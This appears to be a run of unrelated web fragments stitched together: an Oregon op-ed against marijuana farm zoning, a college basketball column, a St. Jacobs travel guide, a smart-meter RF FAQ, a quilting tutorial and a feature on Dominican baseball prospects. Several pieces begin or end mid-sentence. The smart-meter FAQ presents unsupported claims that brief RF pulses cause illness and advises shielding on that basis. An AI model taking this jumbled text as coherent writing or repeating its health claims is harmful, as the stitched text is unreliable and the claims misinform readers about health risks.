by developing what they called an Opt In program for growers where they could sell their extra marijuana to the recreational marijuana market. However, it was not a mandate for the 47,430 unregulated marijuana grow sites to become part of this program, leaving another unregulated loophole.</p>   <p>Finally, Oregon&#x2019;s legislators decided to redefine marijuana as an agricultural farm crop under House Bill 3400 (section 34 (1), which gives recreational marijuana grows an immunity loophole in all of Oregon&#x2019;s exclusive farm use areas under the States &#x201c;Right to Farm Act.&#x201d; This bill denies nuisance lawsuits against farmers who use accepted and standard farming practices, and it does not require any neighbor notification or conditional use permits. It allows only the state to regulate it without jurisdiction control.</p>   <p>What does this means for Oregon&#x2019;s rural farming residents? It means a complete and utter takeover of all of Oregon&#x2019;s rural residential farming communities. While it was the urban voters who voted yes for marijuana legalization, it was the rural voters who voted no who are being most impacted.</p>   <p>Rural Oregon farming residents are seeing large out-of-state land grabs for the sole purpose of growing commercial recreational marijuana. So imagine, one day you have a horse pasture next to your home and the next day this 40 acre pasture has been turned into a 300&#x2019; x 700&#x2019; compound completely surrounded by a 6&#x2019; high fence with 10 rows of barbed wire on the top not only blocking your once beautiful view, but omitting the skunk smell of pot, 24-hour a day lighted greenhouse that lights up the night sky for miles, and increased traffic completely changing the rural farming character and culture that you have enjoyed.</p>   <figure>    <figcaption>     Rep. Earl Blumenauer advocates for marijuana legalization, which conflicts with . Rural life in his district is being destroyed. Photo: AP    </figcaption>   </figure>   <p>Congressman Earl Blumenauer &#x2014; who promotes marijuana in Oregon and is trying to legalize marijuana at the federal level &#x2013;has many his rural residential farming constituents in his district unhappy with him. Here&#x2019;s a letter Rachel McCart wrote to Rep Blumenauer.</p>   <p><em>&#x201c;Dear Congressman Blumenauer: </em> <em>I have voted for you in previous elections and want to let you know why I will not be voting for you in future elections. I cannot support your efforts to legalize marijuana at the federal level. Here&#x2019;s why. </em> <em>I, like many other voters, voted for Measure 91 with the idea that decriminalizing possession of small amounts of marijuana and allowing individuals to grow up to four plants at their home would result in reducing law enforcement burdens and getting illegal, dangerous grows out of public and tribal land. What I did NOT vote for was having marijuana classified as a &#x201c;crop&#x201d; for the purposes of the Right to Farm Act. </em> <em>The result has been an explosion of marijuana production and processing in our Beavercreek rural community, with Clackamas County having little ability and almost no resources available to ensure that marijuana-related land uses are reasonable and safe. Razor-wire fences, iron gates and no trespassing signs are springing up everywhere in our formerly picturesque, quiet and safe community.&#x201d;</em> Rachel Kosmal McCart</p>   <h2>Compared to Colorado</h2>   <p>Compared to Colorado, for example, recreational marijuana is not allowed to be grown outside of industrial areas. Over 70% of Colorado, Washington, and Oregon jurisdictions have banned medical and recreational grows, processing sites and stores in their communities. Those counties and cities who have decided to Opt In to the cash-mongering goals of the pot advocates should be reminded that marijuana is still federally illegal. County and city officials who take an oath to serve both State and Federal laws put themselves in a position of aiding and abetting the illegal drug market.</p>   <p>The complete and utter takeover of our rural residential farming communities through the redefinition of marijuana as an agricultural farm crop is inflaming rural Oregon voters. To complicate this outrage even more, the Oregon Liquor License Commission is issuing more than one recreational marijuana growing license to one site address.&#xa0; What this means for Oregon rural farming residents is that a landowner can receive a marijuana growing license on a tiered system and be allowed to have one 5000-10,000 sg. Ft. indoor marijuana grow and one 20,000 to 40,000 sg. Ft. outdoor marijuana grow.&#xa0; Then the landowner can lease the rest of his land to other marijuana growers therefore using the entire piece of land just to grow marijuana. In some areas of Oregon, 86 to 100 acre parcels have been purchased by out-of-state investors just to grow marijuana without any consideration to the impacts of neighbor&#x2019;s public safety, quality of life, or property values.

icense Commission also is not putting any limits on the number of marijuana growing licenses that will be issued, meaning that an entire rural residential farming community can be taken over by large recreation marijuana grows.</p>   <h2>Problems California Must Recognize</h2>   <p>California is currently working to regulate their existing medical marijuana program through a bill called AB243. Below is the verbiage of a portion of this bill &#x201c;medical cannabis is an agricultural product.&#x201d;</p>   <p>11362.777. (a) The Department of Food and Agriculture shall establish a Medical Cannabis Cultivation Program to be administered by the secretary, except as specified in subdivision (c), shall administer this section as it pertains to the cultivation of medical marijuana. For purposes of this section and Chapter 3.5 (commencing with Section 19300) of the Business and Professions Code, medical cannabis is an agricultural product.</p>   <p>What does this mean for rural farming residents of California? That is a question all rural farming residents should be asking in all States concerned about the impacts of marijuana in their communities.</p>   <p>In closing, I would like to warn other states about this immunity redefinition of marijuana as a farm crop loophole. Although many innocent voters have been misled by the highly funded ballot initiatives that push the so-called &#x201c;medical&#x201d; marijuana and recreational marijuana schemes, many citizens have observed the impacts first hand and are standing up to these deceptive attempts to try and ignore the impacts to public safety, quality of life, and property values. Drugged driving, diversion to other States, destruction to the environment, diversion to minors, public consumption, robberies, burglaries, fatal shootings, odors, increased traffic, fires, hash oil explosions are just a few of the impacts that marijuana leaves behind. The scheme of medical marijuana and marijuana legalization leads to the degradation of our neighborhoods and it is important that citizens begin to inform their communities.</p>   <p><em>Shirley Morgan lives in Oregon and has a BA in Human Communications from Marylhurst University in West Linn (1999), Oregon; MA in Whole System Design/Organizational System Renewal from Antioch University in Seattle (2003), Washington; MS in Community and Economic Development from Southern New Hampshire University-Manchester, New Hampshire (2008); Associates of Church Leadership-Portland Bible College, Oregon (2015)</em> <span>References</span> 1.

But it's headed that way,&#xa0;primarily because of two dynamic coaches, both of which were bold hires by the directors of athletics.</p>   <div>    <p>Bruce Pearl stepped off the plane and yelled &quot;War Eagle&quot; to Auburn fans waiting to greet him.</p>   </div>   <p>Auburn hired Bruce Pearl last season. &#xa0;He atoned for his NCAA sins at Tennessee. &#xa0;He shook hands and kissed babies and campaigned his way into Mr. Popularity on campus.</p>   <p>Then Alabama did the best it could to match or trump Pearl. &#xa0;Bill Battle hired Avery Johnson, with his impressive NBA resume and exposure on ESPN. &#xa0; Recruits will see Johnson as a help-me-up into pro basketball.</p>   <div>    <p>Bill Battle, right, welcomes Avery Johnson as the new men's basketball coach at the University of Alabama.</p>   </div>   <p>Both guys can coach. &#xa0;Pearl won an SEC title and led Tennessee to the Sweet 16. &#xa0;Johnson took a team to the NBA Finals and was the league's coach of the year.</p>   <p>With these guys, the basketball version of the <b>Iron</b> Bowl is fixing to get real, real interesting and fun.</p>   <p>You used to have crush on basketball? &#xa0;It's time to fall in love now.</p>  </div>  
   <div>   <p>Whenever summer starts to transition into fall, I start thinking about pies. Well, not just pies, as in the freshly-picked apple variety, but also about carrot cake (mostly for the cream cheese icing) and meatloaf and all sorts of other comfort food worth turning the oven on for. I also start thinking about day trips to the country, to help wean me off of cottage life and the great outdoors before hunkering down for a long Canadian&#xa0;winter &#x2013; which makes this&#xa0;the perfect time of year&#xa0;to head to the village of St. Jacobs, about an hour or so northwest of Toronto.</p>   <p><strong>The Village of St. Jacobs</strong></p>   <div>    <p>A mural on the side of a store in the village of St. Jacobs, Ontario</p>   </div>   <p>There are plenty of quaint, charming little towns where you are likely to see horse-drawn carriages driving down their main streets, at least the kind of carriage where you pay the driver to tour you through the historic streets. But visit the village of St. Jacobs, near Waterloo, Ontario, and the horses and carriages you see are not for hire by tourists; they are the main form of transportation for the region&#x2019;s predominantly Mennonite residents. The complete opposite of flashy or touristy, these plain and simple buggies reflect the philosophy of the people who use them, since Mennonites eschew technology and most&#xa0;trappings of the modern world in favour of a simple, spiritual life. As frequent visitors to St. Jacobs themselves, you&#x2019;ll find parking spaces for their horses and buggies right alongside some of the carparks in the town.</p>   <p>But catching a glimpse of these buggies on the village&#x2019;s streets is only part of&#xa0;what adds to St. Jacobs&#x2019; charms.</p>   <p><strong>Shopping, Shopping, Shopping!</strong></p>   <p>Bring your credit card if you&#x2019;re planning on visiting St. Jacob&#x2019;s, because this little town&#x2019;s King Street is sure to appeal to every type of shopper. Whether you are looking for country-chic decor items for your home, Christmas decorations, fashion, handcrafted furniture or artisinal one-of-a-kind treasures, the few blocks that make up this village&#x2019;s main street have it all.</p>   <p>There&#x2019;s also a couple of particularly interesting shops, as important for their history as their crafts; the first are <strong>The Village Silos</strong>, a group&#xa0;of grain silos across from the Mill that have become art studios and boutiques for potters and weavers. Some of the&#xa0;artists actually work inside the hollow concrete structures, while other silo spaces are used to display artwork and crafts. You&#x2019;ll definitely want to explore these by wandering through the series of doorways that have been punched through these connected silos &#x2013; it&#x2019;s a truly unique shopping experience!</p>   <p><strong>Hamel Brooms (a former blacksmith shop from 1908)</strong></p>   <div>    <p>Hamel Brooms (the former Blacksmith) in St. Jacobs</p>   </div>   <p>Stepping into this shop is a little like stepping back in time, to the days when hardware stores weren&#x2019;t big-box mega-warehouses selling mass-produced goods, but instead were home to local forges and&#xa0;the expertise of the blacksmith showed in&#xa0;the quality of his hand-forged&#xa0;nails and other metal tools. The forge is still there, as are wooden barrels of nails, and&#xa0;antique tools, gadgets and household items &#x2018;from the day&#x2019;.</p>   <div>    <p>The old forge furnace and just-made brooms at Hamel Brooms Co.</p>   </div>   <p>The shop, with its creaking wood plank floors (that urban designers would give their eye teeth for)&#xa0;is also home to the Hamel corn broom making shop, where you can watch a broom being made right in front of your eyes using techniques that haven&#x2019;t changed in generations. Or if glasswork is more your style, the back of the shop houses the Robert Brown Glass and Metal Studio where you can find artistic vessel sinks, or decorative glass-art panels for doors.</p>   <p><strong>Artefacts Architectural Salvage</strong></p>   <div>    <p>Artefacts Salvage is a treasure trove for reclaimed objects and materials</p>   </div>   <p>This may be my favourite place to poke around&#xa0;in all of&#xa0;St. Jacobs, and if you&#x2019;re a fan of architectural salvage, rotting pillars, posts and corbels, or rusty old <b>iron</b> <b>gates</b>, you&#x2019;re going to feel like you&#x2019;ve died and gone to second-hand heaven. From antique door hardware to stained glass windows and unique doors, Artefacts has enough curiosities and <em>objets</em>&#xa0;to give any home more character. A word of advice: measure before you commit, since&#xa0;some of these impressive pieces will look way&#xa0;bigger in your home than they do in this barn-sized warehouse (some of the prices are larger than life, too.)</p>   <p><strong>All Aboard a Vintage Train</strong></p>   <div>    <p>Engine No. 9 of the Waterloo Central Railway</p>   </div>   <p>From the village of St. Jacobs itself, your next stop is the region&#x2019;s&#xa0;famous Farmers&#x2019; Market, and what better way to travel between village and market than to leave your car behind and hop aboard a vintage train! Who needs a touristy carriage when you&#x2019;ve got an authentic locomotive, with carriages that have been lovingly restored by volunteers, some of whom&#xa0;drive the train or&#xa0;act as conductor-cum-tour-guides as well. runs between St. Jacobs Village at one end, and the town of Elmira at the other, with a stop at St. Jacobs&#xa0;Farmer&#x2019;s Market in the middle.&#xa0;Whether you&#x2019;re a kid or a grownup, riding what feels like your own&#xa0;private train is something you just don&#x2019;t do everyday.</p>   <div>    <p>Buy a ticket and travel back in time on the Waterloo Central Railway&#x2019;s restored carriages.</p>   </div>   <p><strong>St. Jacobs Farmers&#x2019;&#xa0;Market</strong></p>   <p>The largest year-round farmers&#x2019; market in Canada, locals and locovores&#xa0;have loved this Farmers&#x2019; Market for years, ever since it was established in 1975. But in 2013,&#xa0;fire ripped through the building, destroying the structure and devastating the community and visitors who make it a regular destination. But like the proverbial phoenix, in just over a year, a brand new building&#xa0;rose from the ashes, and the new Market&#xa0;is back in full operation, and bigger than ever with more than 400 vendors on the grounds.</p>   <div>    <p>Rebuilt after a 2013 fire, the new St. Jacobs Market is a local tradition</p>   </div>   <p>Fancy a little German sausage? Buy it by the meter. Locally-tapped maple syrup?

If it&#x2019;s locally-sourced, home made or&#xa0;farm-fresh, you&#x2019;ll find it all&#xa0;on the main floor or outside where local farmers set up temporary stalls to sell in-season produce.</p>   <div>    <p>Tempting desserts inside St. Jacobs Market</p>   </div>   <p>For more than just food, head upstairs to the loft-like second floor of the main building, where&#xa0;you&#x2019;ll find household items, affordable decor and hand made crafts.

If you&#x2019;re lucky, and you time your visit when there&#x2019;s an auction happening, you can head upstairs and&#xa0;park yourself ringside&#xa0;to watch the auction action and&#xa0;try to decipher what the auctioneer is saying in his fast-paced chant.&#xa0;(When I was there, it looked like all they were selling were saddles, not what goes underneath them!)</p>   <p>Whether you&#x2019;re an urban cowboy, or not down at all with the whole cow thing, a visit&#xa0;to St. Jacobs is one of the best trips you can make&#xa0;in the fall, offering everything from antiquing and artisans to auctions and&#xa0;apples&#xa0;(for all those pies I&#x2019;ve been dreaming about).</p>   <blockquote>    <p><em><strong>TIP:</strong>&#xa0;St. Jacobs Farmers&#x2019; Market is open Thursdays and Saturdays all year from 7am to 3:30 pm, with most of the shops in the Village of St. Jacobs open every day.

   <div>   <p><strong>&#xa0;<strong>&#xa0;<strong> _________________________________</strong></strong></strong></p>   <p><em><strong>Q: Can I measure the RF radiation of my &#x201c;smart&#x201d; meter myself?</strong></em></p>   <p>Yes, you can purchase a meter for relatively low cost and learn how to read it yourself. There are several consumer devices on the market that measure the radiation that &#x201c;smart&#x201d; meters emit. We recommend the Cornet ED78S as an entry-level, complete, and portable meter, and .</p>   <p>One of the issues with &#x2018;smart&#x2019; meters is that they have extremely short spikes of RF&#x2014;usually just 2-3 milliseconds (2/1000th of a second). While your utility would have this sound harmless, it seems clear from the number of health complaints that the <strong>human nervous system has no trouble registering a signal that is that brief</strong>. In fact the electrical signals throughout our body go off in similarly brief periods of time. Some measuring devices built to measure conventional fields of RF may not have a &#x201c;sampling rate&#x201d; sufficient to pick up the extremely brief individual pulses. The has a high sampling rate and is able to accurately measure smart meter radiation.</p>   <p>Most electric &#x201c;smart&#x201d; meters are in the 800-1000 MHz (megahertz) range of the radio-frequency microwave band. Gas meters can be in the 400-500 MHz range, and in-home appliance networks (HAN) (including the 2nd radio in the &#x2018;smart&#x2019; meter) are in the 2.4-2.5 GHz (gigahertz) range. The measures 100 MHz &#x2013; 8 GHz.</p>   <p>One citizen-scientist posts videos online showing how various meters work: </p>   <p><em><strong>Q: Can I shield my living space from the RF radiation from my &#x201c;smart&#x201d; meter?</strong></em></p>   <p>It might be possible, but we don&#x2019;t guarantee your results.</p>   <p>The idea of shielding is to place a RF barrier between you and the source of the RF. Several materials block RF radiation. Here is a basic explanation of how shielding can be set up: . (Stop Smart Meters does not necessarily endorse the products on this website, but this is useful information.)</p>   <p>Aluminum foil, especially the heavy-duty type, in two layers, overlapping, can block a good deal of RF (shiny side toward the source of the RF). Aluminum mesh screening from a hardware store can effectively shield RF as well. Here is a video demonstrating this: </p>   <p>However, we would like to make clear that shielding can produce unwanted or unexpected problems. Shielding without being able to measure the resulting effectiveness is not recommended. Shielding in the presence of multiple sources of RF is not recommended&#x2014;a shield against one RF source can act to reflect and intensify the RF from another source. Some people harmed by &#x201c;smart&#x201d; meter installations have not found relief with shielding. So we recommend trying it with important several caveats:</p>   <p>&#x2013;If your &#x201c;smart&#x201d; meter has made you sick, first disconnect all other wireless devices, wifi, cordless phones, microwaves, fluorescent light bulbs, etc. then shield with care, and pay close attention to how the change makes you feel.</p>   <p>&#x2013;Get help doing it, because if you are sensitive, you do not want to be standing directly in front of the meter for any period of time.</p>   <p>&#x2013;Consider hiring an EMF consultant to aid you in your plans.</p>   <p>&#x2013;Buy an to measure the radiation in your environment, so you can shield in the right places and measure the results.</p>   <p>&#x2013;Try several things before you give up.</p>   <p>&#x2013;Document what you do&#x2014;we are interested, and any successes can be shared here. Write .</p>   <p>&#x2013;Make sure other sources of RF in your environment are removed or relocated, such as cordless phones or WiFi.</p>   <p>&#x2013;Always ground your shielding. Ask an electrician for help.</p>   <p>We don&#x2019;t recommend wrapping the meter in foil, as this may cause the meter to increase power to the transmitter, as it attempts to connect repeatedly. We say this after receiving several anecdotal reports to this effect, and so although we can&#x2019;t explain how or why this happens, we can say that <strong>some people have felt worse around a wrapped meter.</strong></p>   <p>Our disclaimer applies to the use of this info, which is provided for informational purposes only.</p>   <p><em><strong>Q: Are there any downsides to shielding the RF from the &#x201c;smart&#x201d; meter?</strong></em></p>   <p>If your home contains other sources of RF radiation, such as cordless phones or WiFi, these will be bounced back into your living space. If you have multiple external sources outside your home, like cell antennas and other &#x201c;smart&#x201d; meters in the neighborhood, you must consider how shielding effects those radiation sources. Measurement is key for complex situations, but not hard for people to learn themselves. are available from the Stop Smart Meters! store.</p>   <p>That said, shielding material between you and your &#x201c;smart&#x201d; meter can cut down the worst of it. However, we do not guarantee that this measure will help all persons made sick by their &#x201c;smart&#x201d; meters, because other electrical issues appear to factor into the illness these meters are causing, including . Grounding is always recommended for any shielding arrangement.&#xa0; At the end of the day, it is always preferable to remove the source of the radiation. (see section on )</p>   <p><em><strong>Q: Can I shield the RF from my gas meter?</strong></em></p>   <p>Gas meters are often free-standing and thus it could be easier to cut the emissions from the &#x201c;smart&#x201d; module on your gas meter. We have information from a southern California utility customer who shielded her gas meter, so as to cut the RF going into her house, but not cut it off from communicating with the mesh network. She measured the RF before and after, and says the amount entering her home from the gas meter was greatly reduced. She used a flexible metal screening mesh from a big-box store and a stapler, wrapping the meter and stapling it in place, and then cutting an opening in the side furthest from her house, to let the signal out. This she says, appears to direct the RF away from her home. Stop Smart Meters! can&#x2019;t assure your results, nor the safety of this arrangement.</p>  </div>

   <div>   <p>Hello, Quilters! &#xa0;Today is Tuesday, and that means we need to get to work&#x2026;doodling and quilting! &#xa0;At the risk of repeating myself, drawing the motifs on paper is an excellent way to practice. &#xa0;If you can&#x2019;t draw a motif, you&#x2019;ll never be able to quilt it smoothly. &#xa0;So pull out your paper and pen, or a dry-erase board as Elizabeth (one of our readers) recommends and practice while you are at your computer. &#xa0;The stitching will flow much easier when you can draw the pattern smoothly.</p>   <p>Today&#x2019;s pattern is very very simple. &#xa0;The Picket Fence can stand alone and looks adorable on any floral quilt, or child&#x2019;s quilt. &#xa0;If you like, you can add a &#x201c;second pass&#x201d; of spiral flowers. &#xa0;See the<strong> Spiral &#xa0;Lollipop Flower</strong> tutorialand &#xa0;<strong>The Tulip</strong> would also look great. &#xa0;See that tutorial </p>   <p>This pattern can be stitched in any size. &#xa0;For today&#x2019;s tutorial, we will stitch a 5 inch fence. &#xa0;Begin by drawing a line along the length of your fabric. &#xa0;This is the&#xa0;<strong><em>Baseline.&#xa0;</em>&#xa0;</strong>Draw the second line four inches above the <em>baseline.</em> &#xa0;Draw a third line, one inch above your second line. &#xa0;(It will be five inches from the <em>baseline.)</em></p>   <p>Then draw lines perpendicular to the<em> baseline</em> and 1-1/2 inch apart. &#xa0;We will stitch on either side of these lines, but not on the lines.&#xa0;</p>   <p>Begin stitching on the <em>baseline.</em> &#xa0;Stitch straight up to the 4 inch line and angle up to the top line. &#xa0;Angle back down, then stitch right next to the drawn line and back to the baseline.</p>   <p>Stitch over a few stitches and begin stitching the second picket.</p>   <p>The above photo shows my Bernina with the offset quilting foot that I prefer. &#xa0;I used Sulky 40 wt thread and #80 Quilting needle.</p>   <p>The picket fence would look lovely as a border. &#xa0;In some quilts, I think it would be lovely all by itself&#x2026;</p>   <p>Of course, I would never be able to resist all that open space&#x2026;.</p>   <p>I prefer a variety of flowers for more interest. &#xa0;A row of grass would be cute too. &#xa0;While I&#x2019;m looking at this&#x2026;a bird sitting on the fence would be darling&#x2026;</p>   <p>Sometimes, you just have to stop&#x2026;.</p>   <p>I hope you enjoy this easy tutorial. &#xa0; Use it. Make it your own. &#xa0;Share it. Pin it. &#xa0;I would be delighted to see some of <strong>YOUR</strong> free motion quilting. &#xa0;Send me photos or links&#x2026;I&#x2019;d love to share them!</p>   <p>Please remember&#x2026;all the tutorials and photos are the property of<em> Lori Kennedy</em> at <strong>The Inbox Jaunt. &#xa0;</strong></p>   <div>    <div>     <h3>Please share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

The men jumped from city to city, stopping ashore in Cabarete, Puerto Plata, Gaspar Hernandez. They drank rum and Cokes and <em>pina coladas</em> on the water as their real girlfriends awaited them 200 miles away in Cout&#xed;. In one weekend, Veras alone blew more than 50,000 <em>pesos</em>, about $3,000.</p>      <p>Alone on the open road, and still wearing baseball pants they put on three days earlier, they shared memories of the mini-vacation as the aqua-colored Toyota whisked around S-shaped turns at 70 mph. Exhausted, Veras leaned his head on the cold car window and fell asleep.</p>      <p>Minutes later, his heavy eyelids opened back up.</p>      <p><em>&#x201c;Where are we?&#x201d;</em></p>      <p>A tree stump laid arms-length away, the new car resting calmly against the trunk. The car&#x2019;s hood smashed in. Blackness engulfed them.</p>      <p>&#x201c;<em>Mi carro</em>,&#x201d; Gipsy thought to himself. &#x201c;<em>Mi carro</em>.&#x201d;</p>      <p>The men were just lucky they didn&#x2019;t plunge off the cliff.</p>      <p>If Gipsy&#x2019;s foster brother Frank hadn&#x2019;t hit a tree, the two of them might have been dead, and Gipsy never would have become a pitching coach in the Blue Jays&#x2019; system, his most recent job. He wouldn&#x2019;t become someone who took all those pills.</p>      <p>He wouldn&#x2019;t have become anything.</p>      <p>And nearly 20 years later, prospect Miguel Almonte wants to become something.</p>      <p>&#x2022; &#x2022; &#x2022;</p>      <p>Yewri Guill&#xe9;n&#x2019;s head wouldn&#x2019;t stop throbbing. A free clinic doctor diagnosed the 18-year-old Washington Nationals signee with bacterial meningitis almost three years ago, but because the terms of his deal weren&#x2019;t yet complete, he couldn&#x2019;t foot the bill for a $1,300 stay at a private hospital. And the headaches continued.</p>      <p>The MLB investigated Guill&#xe9;n for identity fraud and suspended him for a year before he lay ill in a hospital bed, with the league claiming he lied about his birthday to increase his signing bonus. Guill&#xe9;n was supposed to travel to Florida to play for the Nationals&#x2019; rookie league team there in mid-April, after the MLB authorized his contract. But he never made it. Instead of flying to the United States April 15, 2011 as planned, he died in a clinic that day, according to a March story in Mother Jones.</p>      <p>Long before the incident came to light, Major League Baseball&#x2019;s relationship with the island nation was regarded as predatory by critics Dominican and American. Five years ago, the MLB sent activist Charles Farrell to Santo Domingo to examine the issues surrounding baseball in the country. What he found was a system that destroyed young lives: scouts, known as <em>buscones</em> or searchers, taking large cuts of players&#x2019; signing bonuses for themselves. Trainers pumping illegal substances into players to increase their chances of success. Players with no sense of money or how to manage it blowing their entire bonus checks in a matter of years, even in just a few months. Players routinely lied about their names and ages to increase their chances of being signed. MLB officials would never know his real name, but Gipsy Veras fell into nearly every trap.</p>      <p>The problem is simple: MLB teams like the Blue Jays treat Dominican players as investments, looking at the country as an arm of a larger $4 billion business model. And the minimum age to sign Dominican players, 16, &#x2013; &#x201c;and they&#x2019;d take them younger if they could,&#x201d; Farrell says &#x2013; reflects the league&#x2019;s attitude. Players in the United States must be 18, or have completed high school to sign. Teams regard the Dominican Republic as an unregulated free agent pool.&#xa0; And young Dominicans feed into it.</p>      <p>They want to have it made. Problem is, on opening day last year, only 83 of their countrymen appeared on rosters. One out of 50 signees will ever make it to the majors. And that&#x2019;s just for a single day, a cup of coffee. For many, the journey to get there &#x2013; or the aftermath of getting cut &#x2013; will be the most difficult part.</p>      <p>The question now is where baseball will take 17-year-olds like Almonte, a Blue Jays prospect who signed a $100,000 contract July 2.&#xa0; The odds facing kids like him are long &#x2013; &#x201c;astronomical,&#x201d; in Farrell&#x2019;s eyes.</p>      <p>The fates of thousands like Gipsy, on the other hand, have already been sealed. After stints as pitching coach with the Minnesota Twins, Los Angeles Dodgers and most recently the Blue Jays, the 35-year-old is now working as a trainer and scout for young Dominican players. But for him, life after baseball almost didn&#x2019;t happen at all.</p>      <p>Like him, thousands will return to the Dominican Republic after seeing their Major League dreams fail, with little money, no education and no professional skills.</p>      <p>Miguel Almonte just hopes he&#x2019;s not one of them.</p>      <p><em>Miguel Almonte has worked at making it to the United States to play baseball since he was 7. For many in his position, there&#x2019;s weight to succeed from birth, to lead families out of poverty and be the salvation for entire neighborhoods and villages in the country.</em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Leading off for the Blue Jays, shortstop&#x2026;&#x201d;</em></p>      <p>The announcers still haven&#x2019;t learned how to say his name. Maybe, they never will. But at age 17, Miguel Almonte is already batting ahead of all-stars Jos&#xe9; Bautista and Edwin Encarnaci&#xf3;n.</p>      <p>The manager had to bench the teenager&#x2019;s favorite player, Jose Reyes, to make this lineup possible. But early on into the season, the move is paying dividends. Through a few months of play, Almonte bats .315 with 10 homers. The 5-foot-11, 186-pound teen is one of the most feared hitters in the American League East. He&#x2019;s dominating.</p>      <p>The fantasy is getting more real by the day. And sure, it&#x2019;s only possible in video game form right now &#x2013; Miguel, still stuck playing and managing his MLB 2K11 Blue Jays team. But lately, the dream&#x2019;s been starting to feel tangible.</p>      <p>On a muggy December afternoon in east Santo Domingo, the acne-ridden teenager sits in his mom&#x2019;s patio hair salon, swiping through pictures on his smartphone before baseball practice. He&#x2019;s easily the best-dressed person in the neighborhood today, wearing a plaid shirt with rolled-up sleeves, fitted blue jeans and a silver wristwatch.</p>      <p>&#x201c;This one is cheap,&#x201d; he says, referring to the timepiece, the label on which reads &#x201c;Bell.&#x201d;</p>      <p>As his mother applies rollers to a woman&#x2019;s hair, he begins scrolling down the website of fashion label Nautica. Moments later, the kid with the chinstrap beard pulls up a picture of a chrome-faced watch with a blue leather strap, and a set of smaller gauges.</p>      <p><em>&#x201c;Eeesstyle,&#x201d;</em> the 17-year-old says, hesitantly in English. &#x201c;It&#x2019;s $350. I&#x2019;m think I&#x2019;m going to buy it.&#x201d;</p>      <p>Coaches have warned Miguel about purchases like these. But sometimes, he says, it&#x2019;s hard not to treat himself.</p>      <p>On July 2, the 17-year-old inked a $100,000 minor league contract with the Blue Jays. A fourth of his signing bonus went to his coach, Augustine Ramos of the Neftali Cruz development league, where he was discovered. Fifty thousand dollars is being put away for his mother&#x2019;s new five-bedroom home in an upscale Santo Domingo neighborhood.</p>      <p>With the rest of the money, Miguel says he wants to buy himself a car &#x2013; something practical.</p>      <p>Maybe a Camry.</p>      <p><em>&#xa0;<strong>&#x2022;&#x2022;&#x2022;</strong></em></p>      <p><span>The first thing that strikes you about Gipsy Veras is his cleanly pressed Gucci polo, with red and green trimming on the sleeves and collar, conforming perfectly to a bulging chest, rounded belly, and toned arms. Stress pulls at the 35-year-old&#x2019;s drooping eyes, the lines running up his forehead and escaping onto a hairless scalp. He wears lime green fitted slacks. The links of his stainless steel wristwatch glimmer like the silver cross adorning his neck. Gipsy could not afford to buy the outfit he&#x2019;s wearing today.</span></p>      <p>The parallels between him and a 17-year-old on the other side of town are hard to ignore. Like Miguel, Gipsy signed a six-figure contract to play professionally as a teen. Like Miguel, he put a large chunk of his bonus money into a house for Mom. Like Miguel, he indulged in the latest fashions right away, constantly trying to outdo friends in the neighborhood.</p>      <p>Like Miguel, Gipsy was going to be famous.</p>      <p>Isn&#x2019;t everyone?</p>      <p>Gipsy&#x2019;s story is about poverty and wealth and how wealth can cause poverty all over again. It&#x2019;s about having nicer clothes than your teenage friends, the Nautica watch and Nikes, and doing favors &#x2013; 100 <em>pesos</em> here to buy lunch for a neighbor, another 500 there to pay his rent &#x2013; favors for everyone but yourself. It&#x2019;s a story about when dreams consume people, and swallow them whole. All while executives in tall buildings a country away, less than a 1,000 miles away, cash in on the successes of the lucky few, on the talent of your countrymen, mired in a limited economic system.</p>      <p>This is a story about sitting in your childhood bedroom and facing yourself once you&#x2019;ve lost everything.</p>      <p><span><iframe>&amp;amp;lt;a href=&quot;     <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Every day at 8 a.m., Miguel rolls out of bed and takes a long look in the mirror before baseball practice. He slips his mirrored sunglasses over his freshly cut three-quarter fade, kept perfect by weekly barbershop visits. He squirts Axe body spray onto his chest before throwing the can into his retro Toronto Blue Jays duffle bag.</span></p>      <p>After a breakfast of corn flakes, he leaves the house and heads for the metro station. In his Blue Jays cap and shirt, his Blue Jays shorts and his blue Nikes, the 17-year-old looks as if he&#x2019;s headed straight for the Rogers Centre. Actually, he&#x2019;s walking past <em>colmados</em>, the iconic Dominican street markets, passing a slew of check cashing shops and fruit stands and beggars on his way to <em>Centro Olimpico</em> baseball stadium, a field better known as the one-time playground of national heroes David &#x201c;Big Papi&#x201d; Ortiz, Sammy Sosa and Vladimir Guerrero.</p>      <p>Recently, Miguel says, something weird has been happening on his way to the train. People recognize him now, and they stop him.</p>      <p><em>&#x201c;Hola. Qu&#xe9; lo que?&#x201d;</em></p>      <p>He knows he shouldn&#x2019;t stop, but he likes the attention.</p>      <p>Until, &#x201c;They start talking, and talking for a while and they say, &#x2018;How&#x2019;s it going?&#x2019; Miguel says. &#x201c;And then they say, &#x2018;Bro, do you have 15,000 <em>pesos</em> you can lend me to take care of something?&#x2019; &#x201d;</p>      <p>At the baseball field he takes batting practice with Augustine Ramos, his longtime coach. Taking a hundred swings. Fielding dozens of groundballs. Throwing laser after laser to first from deep short.</p>      <p>Once, he bombed a meatball all the way to the adjacent bus station, clearing the 330-foot fence by a long shot and nearly landing on Avenida John F. Kennedy. Today, it&#x2019;s all line drives and fly balls, but Ramos doesn&#x2019;t mind. The coach says he wants four things out of his players:</p>      <ol>       <li>Speed</li>       <li>Arm strength</li>       <li>Intelligence</li>       <li>Height</li>      </ol>      <p>Miguel&#x2019;s got them down. He&#x2019;ll run a 6.5-second 60-yard dash when he leaves the academy in time for the MLB&#x2019;s Dominican Summer League in June. He can beam a one-hopper to first in a split second. His baseball IQ is above-average for someone his age, though he receives only four hours of schooling every week, well below the standard for American players. At 5-feet-11-inches, he almost has the same frame as Reyes, the current Blue Jays shortstop.</p>      <p>More than anything, Miguel hates when people doubt him.</p>      <p>One time last year, his manager in a select tournament put him at ninth in the batting order. Miguel threatened not to bat if he wasn&#x2019;t moved up. He even cried.</p>      <p>When he got up to the plate in the final inning, Miguel squared up, cocked his bat and launched a walk-off home run into the stands.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Gipsy beamed as they wrote the checks. Every Dominican boy wants to build his mom a new house.&#xa0;</span></p>      <p>After signing with the Tampa Bay Devil Rays in 1997, Gipsy decided to make good on a long-held vow: remodel his family home. It started out as two cement rooms in the <em>Para&#xed;so de 